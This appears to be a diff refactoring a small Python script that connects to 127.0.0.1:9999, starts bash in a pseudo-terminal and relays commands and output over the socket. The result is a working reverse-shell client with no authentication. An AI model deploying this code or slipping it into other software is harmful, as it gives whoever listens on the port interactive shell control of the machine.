@@ -4,7 +4,11 @@ import socket
 import select
 import pty
 import os
-import time
+import io
+
+HOST = '127.0.0.1'
+PORT = 9999
+TRANSFER_CHUNK_SIZE = 2048
 
 
 def run_bash_pty():
@@ -17,37 +21,29 @@ def run_bash_pty():
         return fd
 
 
-socket = socket.socket()  # client computer can connect to others
-
-host = '127.0.0.1'
-port = 9999
-
-socket.connect((host, port))
-socket.setblocking(False)
-
-time.sleep(1)
-socket.send("Connected\n\r".encode('utf8'))
+sock = socket.socket()
+sock.connect((HOST, PORT))
+sock.send("Connected\n\r".encode('utf8'))
 
 bash_fd = run_bash_pty()
-bash_stdout = os.fdopen(bash_fd, 'rb')
-bash_stdin = os.fdopen(bash_fd, 'wb')
+bash_stdout = io.open(bash_fd, 'rb', buffering=0)
+bash_stdin = io.open(bash_fd, 'wb', buffering=0)
 
 try:
     while True:
-        r, w, e = select.select([socket, bash_stdout], [], [])
+        r, w, e = select.select([sock, bash_stdout], [], [])
 
-        if socket in r:
-            data = socket.recv(1024)
+        if sock in r:
+            data = sock.recv(TRANSFER_CHUNK_SIZE)
 
             if len(data) > 0:
                 print("Received len: ", len(data), " Str Data: ", str(data))
                 bash_stdin.write(data)
-                bash_stdin.flush()
 
         if bash_stdout in r:
-            char = bash_stdout.read(1)
-            print("Sending: ", str(char))
-            socket.send(char)
+            response_data = bash_stdout.read(TRANSFER_CHUNK_SIZE)
+            print("Sending (", len(response_data), "), Content: ", str(response_data))
+            sock.send(response_data)
 
 finally:
-    socket.close()
+    sock.close()
